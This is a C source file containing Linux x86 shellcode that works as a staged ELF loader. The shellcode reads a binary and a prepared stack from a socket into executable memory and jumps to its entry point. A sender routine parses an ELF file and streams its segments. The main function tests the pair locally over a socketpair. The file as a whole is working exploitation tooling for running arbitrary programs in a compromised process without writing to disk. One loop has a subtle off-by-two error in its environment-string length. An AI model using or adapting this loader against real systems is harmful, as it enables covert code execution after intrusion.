#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <elf.h>

unsigned char binload_linx86[] =
	"\x31\xdb"
	"\x8d\x53\x08"
	"\x89\xe1"
	"\x8d\x43\x03"
	"\xcd\x80"
	"\x8d\x43\x5b"
	"\x59"
	"\x5b"
	"\xcd\x80"
	"\x31\xc0"
	"\x8d\x50\x07"
	"\x8d\x70\x32"
	"\x31\xff"
	"\x31\xed"
	"\xb0\xc0"
	"\xcd\x80"
	"\x89\xca"
	"\x89\xd9"
	"\x31\xdb"
	"\x8d\x43\x03"
	"\xcd\x80"
	"\x01\xc1"
	"\x29\xc2"
	"\x75\xf5"
	"\x81\xe4\x01\xf0\xff\xff"
	"\x54"
	"\x89\xe1"
	"\x8d\x53\x04"
	"\x89\xd0"
	"\xcd\x80"
	"\x8d\x43\x03"
	"\x66\xba\x04\x10"
	"\xcd\x80"
	"\xc3";

int send_bin(int sd, char *fname, char *argv[], char *envp[])
{
	int fd, ret;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	size_t i, j, plen, pcpy;
	unsigned int vals[2], *sp;
	unsigned char buf[4100];
	unsigned char *payload;

	ret = -1;
	fd = open(fname, O_RDONLY, 0);
	if(fd < 0)
		return -1;

	payload = NULL;
	plen = 0;

	if(read(fd, buf, sizeof(buf)) < sizeof(Elf32_Ehdr))
		goto cleanup;

	ehdr = (Elf32_Ehdr *) buf;
	phdr = (Elf32_Phdr *) &buf[ehdr->e_phoff];

	vals[1] = 0;
	for(i = 0; i < ehdr->e_phnum; i++)
	{
		if(phdr[i].p_type != PT_LOAD)
			continue;
		if(vals[1] == 0)
			vals[1] = phdr[i].p_vaddr;

		pcpy = plen;
		if(phdr[i].p_filesz > phdr[i].p_memsz)
			goto cleanup;
		if((phdr[i].p_memsz + (4096 - 1) &~ (4096 - 1))
			< phdr[i].p_memsz)
		{
			goto cleanup;
		}

		plen += (phdr[i].p_memsz + (4096 - 1)) &~ (4096 - 1);
		printf("0x%08x -> 0x%08x\n", pcpy, plen);
		if(payload)
			payload = (unsigned char *) realloc(payload, plen);
		else
			payload = (unsigned char *) malloc(plen);
		if(payload == NULL)
			goto cleanup;
		memset(&payload[pcpy], 0, plen - pcpy);

		if(lseek(fd, phdr[i].p_offset, SEEK_SET) != phdr[i].p_offset)
			goto cleanup;
		if(read(fd, &payload[pcpy], phdr[i].p_filesz)
			!= phdr[i].p_filesz)
		{
			goto cleanup;
		}
	}
	vals[0] = plen;

	/* write { length, base_addr } */
	if(write(sd, &vals, sizeof(vals)) != sizeof(vals))
		goto cleanup;
	printf("len: 0x%08x base_addr: 0x%08x\n", vals[0], vals[1]);
	/* write binary */
	if(write(sd, payload, plen) != plen)
		goto cleanup;
	printf("sent payload\n");
	/* get stack address */
	if(read(sd, &vals, sizeof(unsigned int)) != sizeof(unsigned int))
		goto cleanup;
	printf("stack base = 0x%08x\n", vals[0]);
	vals[1] = ehdr->e_entry;
	memset(buf, 0, sizeof(buf));

	/* build stack */
	sp = (unsigned int *) buf;
	/* entry point */
	*(sp++) = vals[1];
	/* argc */
	for(j = 0; argv[j]; j++);
	*(sp++) = j;

	/* argv */
	for(j = 0, i = sizeof(buf); (unsigned int) &buf[i]
		> (unsigned int) sp && argv[j]; j++)
	{
		i -= (strlen(argv[j]) + 1);
		strcpy(&buf[i], argv[j]);
		*(sp++) = i + vals[0];
	}
	*(sp++) = 0;

	/* envp */
	for(j = 0; (unsigned int) &buf[i] > (unsigned int) sp && envp[j]; j++)
	{
		i -= (strlen(envp[j]) - 1);
		strcpy(&buf[i], envp[j]);
		*(sp++) = i + vals[0];
	}
	*(sp++) = 0;

	/* send stack */
	if(write(sd, buf, sizeof(buf)) != sizeof(buf))
		goto cleanup;

	printf("ENTRY: 0x%08x\n", *(unsigned int *) buf);
	printf("CHECKING FOR SUCCESS:\n");
	memset(buf, 0, sizeof(buf));
	while(read(sd, buf, sizeof(buf)) > 0)
	{
		printf("%s", buf);
		memset(buf, 0, sizeof(buf));
	}
	ret = 0;
cleanup:
	if(payload) free(payload);
	close(fd);	
	return ret;
}

int main(void)
{
	void *map;
	char *args[] = { "w00t", "p000", "m0nk3y", NULL };
	char *envs[] = { "TERM=vt100", "GOAT=SEX", "RRR=SSSSSSSSSS", NULL };
	int (*tstcode)(void);
	int sp[2];

	map = mmap(NULL, sizeof(binload_linx86), PROT_READ | PROT_WRITE
		| PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
	memcpy(map, binload_linx86, sizeof(binload_linx86));
	tstcode = (int (*)()) map;

	if(socketpair(AF_UNIX, SOCK_STREAM, IPPROTO_IP, sp) < 0)
	{
		perror("socketpair");
		return 1;
	}
	switch(fork())
	{
		case 0: /* child */
			dup2(sp[1], 0);
			dup2(sp[1], 1);
			dup2(sp[1], 2);
			tstcode();
			break;
		default:
			usleep(100);
			waitpid(-1, NULL, WNOHANG);
			break;
	}
	if(send_bin(sp[0], "./static", args, envs) < 0)
	{
		printf("ERROR!\n");
		return 1;
	}
	return 0;
}

